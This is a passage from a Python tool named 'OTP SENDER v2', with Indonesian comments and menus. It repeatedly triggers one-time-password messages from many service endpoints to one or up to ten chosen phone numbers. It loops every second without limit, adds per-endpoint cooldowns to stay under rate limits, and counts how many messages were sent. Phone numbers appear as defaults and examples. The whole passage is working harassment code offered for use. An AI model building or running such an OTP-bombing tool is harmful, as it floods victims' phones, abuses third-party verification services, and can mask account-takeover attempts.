                    for n, _, _, _ in lanes}

    def _log(self, name, status, detail=""):
        global TOTAL
        with LOCK:
            if status == "SENT":
                self.sent += 1
                TOTAL += 1
            self.per[name][status] = self.per[name].get(status, 0) + 1
            col = {"SENT": "g", "COOLDOWN": "y", "GATED": "b"}.get(status, "r")
            line = (f"{time.strftime('%H:%M:%S')}|{self.label}|{name}|{status}")
            if VERBOSE and detail:
                line += "|" + str(detail)[:60]
            say(line, col)

    def _fire(self, name, fn, gap):
        if self.cool.get(name, 0) > time.time():
            return
        try:
            st, detail = fn(self.ctx)
        except Exception as e:
            st, detail = "FAIL", type(e).__name__
        # semua status kena jeda: GATED/FAIL jangan ditembak tiap detik
        if st in ("SENT", "COOLDOWN"):
            self.cool[name] = time.time() + gap
        elif st == "GATED":
            self.cool[name] = time.time() + max(60, gap // 2)
        else:
            self.cool[name] = time.time() + 20
        self._log(name, st, detail)

    def run(self):
        while not self.stop.is_set():
            if self.target and self.sent >= self.target:
                break
            self.attempt += 1
            with ThreadPoolExecutor(max_workers=len(self.lanes)) as ex:
                futs = [ex.submit(self._fire, n, f, g) for n, f, g, _ in self.lanes]
                for fu in as_completed(futs):
                    fu.result()
            for _ in range(10):          # jeda 1 detik, responsif Ctrl+C
                if self.stop.is_set():
                    break
                time.sleep(0.1)


# ---------------------------------------------------------------- probe
def probe(only=None):
    raw_num = os.environ.get("OTP_PROBE_NUMBER", "083872681761")
    c = Ctx(raw_num)
    lanes = pick_lanes(True)
    if only:
        lanes = [e for e in lanes if e[0] == only]
        if not lanes:
            say(f"  lane '{only}' tidak ada. pakai --list", "r")
            return
    say(f"  probe ke {c.p08} — {len(lanes)} lane", "b")
    say("")
    for name, fn, _gap, active in lanes:
        tag = "AKTIF" if active else "OFF"
        t0 = time.time()
        try:
            st, detail = fn(c)
        except Exception as e:
            st, detail = "ERR", f"{type(e).__name__}: {e}"
        ms = int((time.time() - t0) * 1000)
        col = {"SENT": "g", "COOLDOWN": "y", "GATED": "b"}.get(st, "r")
        line = f"{time.strftime('%H:%M:%S')}|{c.p08}|{name}|{st}"
        if VERBOSE:
            line += f"|{tag}|{ms}ms|{str(detail)[:60]}"
        say(line, col)
        time.sleep(0.4)
    say("")


# ---------------------------------------------------------------- menu
def ask(prompt):
    try:
        return input(prompt).strip()
    except EOFError:
        raise KeyboardInterrupt


def menu():
    say("=" * 52, "r")
    say("   OTP SENDER  v2", "r")
    say("=" * 52, "r")
    say("")
    say("  1. Single Number  (loop sampai Ctrl+C)", "b")
    say("  2. Bulk Number    (maks 10, loop sampai Ctrl+C)", "b")
    say("")
    while True:
        ch = ask("  pilih [1/2] : ")
        if ch in ("1", "2"):
            break
        say("  !! pilih 1 atau 2", "y")

    numbers = []
    if ch == "1":
        say("")
        while True:
            n = ask("  nomor WhatsApp : ")
            if normalize(n):
                numbers.append(n)
                break
            say("  !! nomor tidak valid, coba lagi", "y")
    else:
        say("")
        say("  pisahkan dengan koma. contoh:", "w")
        say("  083872681761,08212398494,085697218463")
        say("")
        while True:
            raw = ask("  nomor : ")
            parts = [p.strip() for p in re.split(r"[,\s]+", raw) if p.strip()]
            if not parts:
                say("  !! kosong", "y")
                continue
            if len(parts) > MAX_BULK:
                say(f"  !! maksimal {MAX_BULK} nomor, kamu kasih {len(parts)}", "y")
                continue
            bad = [p for p in parts if not normalize(p)]
            if bad:
                say(f"  !! tidak valid: {', '.join(bad)}", "y")
                continue
            numbers = parts
            break

    say("")
    lanes = pick_lanes(True)
    say("-" * 52)
    say(f"  nomor  : {len(numbers)}")
    for n in numbers:
        say(f"    - {normalize(n)[0]}")
    say(f"  lane   : {len(lanes)}")
    say("  mode   : LOOP tiap 1 detik, tanpa target")
    say("-" * 52)
    say("")
    say("  Ctrl+C untuk berhenti", "y")
    say("")
    run(numbers, None, lanes)


def run(numbers, target, lanes):
    global TOTAL
    TOTAL = 0
    stop = threading.Event()
    workers = [Worker(n, stop, lanes, target) for n in numbers]
    t0 = time.time()

    say("=" * 52, "g")
    hm = f"{target} OTP" if target else "tanpa batas"
    say(f"  MULAI — {len(workers)} nomor, {hm}, {len(lanes)} lane", "g")
    say("=" * 52, "g")
    say("")

    threads = [threading.Thread(target=w.run, daemon=True) for w in workers]
    try:
        for t in threads:
            t.start()
        for t in threads:
            while t.is_alive():
                t.join(timeout=1)
    except KeyboardInterrupt:
        say("")
        say("  menghentikan...", "y")
        stop.set()
        for t in threads:
            t.join(timeout=5)

    el = int(time.time() - t0)
    say("")
    say("=" * 52, "g")
    say(f"  {TOTAL} SENT dalam {el}s", "g")
    say("=" * 52, "g")
    for w in workers:
        say(f"    {w.label}  sent={w.sent}  putaran={w.attempt}")
    say("")
    say("  rincian per lane:", "b")
    agg = {}
    for w in workers:
        for k, v in w.per.items():
            a = agg.setdefault(k, {"SENT": 0, "COOLDOWN": 0, "GATED": 0, "FAIL": 0})
            for st in v:
                a[st] += v[st]
    for k in sorted(agg, key=lambda x: -agg[x]["SENT"]):
        v = agg[k]
        say(f"    {k:<13} SENT={v['SENT']:<3} COOLDOWN={v['COOLDOWN']:<3} "
            f"GATED={v['GATED']:<3} FAIL={v['FAIL']}")
    say("")
    say("  Cek WhatsApp. Hitung yang benar-benar masuk.")


def main():
    global VERBOSE
    args = sys.argv[1:]
    if "--verbose" in args or "-v" in args:
        VERBOSE = True
    if "--list" in args:
        say(f"  lane total: {len(ENDPOINTS)}", "b")
        say("")
        for i, (name, _f, gap, active) in enumerate(ENDPOINTS, 1):
            tag = "AKTIF" if active else "OFF"
            gate = " GATED" if name in GATED_NAMES else ""
            col = "b" if name in GATED_NAMES else ("g" if active else "y")
            say(f"    #{i:<3} {name:<13} {tag:<6} jeda {gap}s{gate}", col)
        say("")
        return
    if "--probe" in args:
        only = None
        if "--only" in args:
            i = args.index("--only")
            only = args[i + 1] if len(args) > i + 1 else None
        probe(only)
        return

    lanes = pick_lanes(True)
    if "--once" in args:
        i = args.index("--once")
        run([args[i + 1]], 1, lanes)
        return
    if "--loop" in args:
        i = args.index("--loop")
        run([args[i + 1]], None, lanes)
        return
    menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        say("\n[stop]", "y")
